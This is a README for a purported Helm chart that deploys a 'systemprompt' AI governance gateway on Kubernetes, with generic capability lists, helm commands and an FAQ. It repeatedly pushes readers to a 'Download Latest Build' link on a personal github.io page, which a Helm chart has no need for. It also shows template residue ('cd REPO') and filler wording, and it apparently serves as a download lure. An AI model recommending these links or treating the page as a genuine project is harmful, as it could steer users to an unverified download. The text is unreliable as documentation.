# systemprompt v2026 - Helm Chart Repository 2026

> **Deploy the systemprompt AI governance gateway on Kubernetes with a self-hosted Helm-based distribution aligned with the 2026 release.**

[![Platform](https://img.shields.io/badge/Platform-Kubernetes-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/youngtylerfhr1321/systemprompt-helm-chart-2026?style=flat-square)](https://github.com/youngtylerfhr1321/systemprompt-helm-chart-2026)

---

<p align="center">
  <a href="https://youngtylerfhr1321.github.io/systemprompt-helm-chart-2026/">
    <img src="https://img.shields.io/badge/Download-systemprompt%20Latest-brightgreen?style=for-the-badge" alt="Download systemprompt">
  </a>
</p>

> **[Download systemprompt v2026](https://youngtylerfhr1321.github.io/systemprompt-helm-chart-2026/)**

---

[Download Latest Build](https://youngtylerfhr1321.github.io/systemprompt-helm-chart-2026/)

---

## Overview

systemprompt provides Helm charts for running an AI governance gateway inside Kubernetes. It gives teams a self-managed control layer between their applications and model providers, helping them govern, monitor, and track AI request activity.

The repository distributes signed chart releases and supports deployment patterns suitable for air-gapped environments where outside connectivity or dependencies can be restricted. Its Kubernetes- and Helm-centered workflow can be used with OpenAI, Claude, MCP, and other provider integrations.

---

## Core Capabilities

- Publish Helm charts for Kubernetes installation
- Govern and control AI traffic through a dedicated gateway
- Apply authentication and authorization to AI requests
- Enforce request rate limits
- Provide logs for operational review
- Monitor usage-related costs
- Run the gateway as a self-hosted service
- Distribute releases for air-gap-capable environments
- Support workflows that are not tied to a single provider
- Deliver signed charts for integrity-focused release handling

---

## Getting Started

First obtain the repository and register its chart source with Helm:

    git clone https://github.com/youngtylerfhr1321/systemprompt-helm-chart-2026.git
    cd REPO
    helm repo add systemprompt https://youngtylerfhr1321.github.io/systemprompt-helm-chart-2026/
    helm repo update

Once the repository has been added locally, install the chart using the Helm release command appropriate for your deployment.

---

## Working with the Charts

Use Helm to discover the published packages, review their default settings, and install the selected chart:

    helm search repo systemprompt
    helm show values systemprompt/<chart-name>
    helm install my-gateway systemprompt/<chart-name> -f values.yaml

A normal deployment may include access-policy configuration, request throttling, logging, and connections to the AI providers used by your organization. For MCP or multi-provider environments, tailor the chart values to the intended topology and the access controls that should apply.

---

## Values and Configuration

Gateway behavior is defined through Helm values:

    values:
      gateway:
        auth: true
        authorization: true
        rateLimiting: true
        logging: true
        costTracking: true

Supply your own values file or pass overrides with inline `--set` options during installation and upgrades. Helm controls repository-level operations such as choosing releases and setting deployment parameters.

---

## Prerequisites

- A Kubernetes cluster
- Helm installed on the local machine
- Connectivity to the chart repository
- A runtime environment capable of hosting a self-managed deployment
- Network access to the selected AI provider endpoints, except when using an air-gapped workflow with the necessary artifacts available locally

---

## Frequently Asked Questions

**What does this repository contain?**  
It contains Helm charts used to deploy the systemprompt AI governance gateway.

**Is systemprompt limited to a single AI provider?**  
No. The chart distribution is provider-agnostic and can be used with different AI provider integrations.

**Can the charts be used on restricted networks?**  
Yes. The release profile is air-gap capable, provided the required artifacts are accessible within the restricted environment.

**How are gateway controls configured?**  
Use Helm values to configure authentication, authorization, rate limiting, logging, and cost tracking.

**How can I update to a newer release?**  
Use the download link above and refresh the local Helm repository metadata before performing an upgrade.

**What should I check when deployment fails?**  
Inspect the Kubernetes resources, review the rendered Helm output, and verify that the values file fits both the target cluster and the selected provider configuration.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
